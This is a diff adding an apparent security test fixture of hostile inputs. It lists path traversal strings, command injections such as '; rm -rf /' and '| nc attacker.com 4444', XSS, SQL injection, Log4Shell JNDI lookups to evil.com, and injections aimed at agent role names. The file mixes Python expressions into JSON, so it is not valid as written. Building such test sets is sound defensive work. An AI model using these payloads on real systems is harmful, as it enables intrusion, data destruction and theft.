@@ -1,0 +1,91 @@
+{
+  "path_traversal_inputs": [
+    "../../../../../../etc/passwd",
+    "../../../../../../../windows/system32/config/sam",
+    "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "/proc/self/environ",
+    "/proc/version",
+    "/proc/cmdline",
+    "file:///etc/shadow",
+    "file:///c:/windows/system32/config/sam"
+  ],
+  
+  "command_injection_inputs": [
+    "; rm -rf /",
+    "&& cat /etc/passwd",
+    "| nc attacker.com 4444",
+    "`whoami`",
+    "$(id)",
+    "${IFS}cat${IFS}/etc/passwd",
+    "\"; DROP TABLE users; --",
+    "'; SHUTDOWN; --"
+  ],
+  
+  "script_injection_inputs": [
+    "<script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "vbscript:msgbox(\"XSS\")",
+    "data:text/html,<script>alert('XSS')</script>",
+    "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\"",
+    "\";alert(String.fromCharCode(88,83,83));//\";alert(String.fromCharCode(88,83,83));//"
+  ],
+  
+  "buffer_overflow_inputs": [
+    "A" * 1000,
+    "A" * 10000,
+    "A" * 100000,
+    "\x41" * 1000,
+    "\x00" * 1000,
+    "\xff" * 1000
+  ],
+  
+  "json_injection_inputs": [
+    "{\"key\": \"value\", \"__proto__\": {\"polluted\": true}}",
+    "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
+    "{\"__proto__.polluted\": true}",
+    "{\"\\\": \"\\\", \"key\": \"value\"}"
+  ],
+  
+  "regex_dos_inputs": [
+    "a" * 1000 + "X",
+    "(a+)+b",
+    "(a|a)*b",
+    "^(a+)+$",
+    "^(a|a)*$"
+  ],
+  
+  "memory_exhaustion_inputs": [
+    "{\"data\": \"" + "A" * 1000000 + "\"}",
+    "[" + ",".join(["\"" + "B" * 1000 + "\""] * 1000) + "]",
+    {"deep_nesting": {"level_" + str(i): {} for i in range(1000)}}
+  ],
+  
+  "unicode_exploitation": [
+    "\u0000",
+    "\u0001\u0002\u0003",
+    "\ufeff",
+    "\u202e",
+    "\u200b\u200c\u200d",
+    "\ud800\udc00",
+    "\uffff"
+  ],
+  
+  "format_string_inputs": [
+    "%s%s%s%s%s%s%s%s%s%s",
+    "%x%x%x%x%x%x%x%x%x%x",
+    "{0}{1}{2}{3}{4}{5}",
+    "${jndi:ldap://evil.com/a}",
+    "${jndi:dns://evil.com/a}"
+  ],
+  
+  "agent_specific_exploits": [
+    "DIRECTOR; rm -rf /tmp/*",
+    "SECURITY && cat /proc/version",
+    "TESTBED | nc attacker.com 1337",
+    "'OPTIMIZER'; DROP TABLE agents;--",
+    "DEBUGGER\\x00\\x01\\x02",
+    "MONITOR$(whoami)",
+    "`PLANNER`"
+  ]
+}
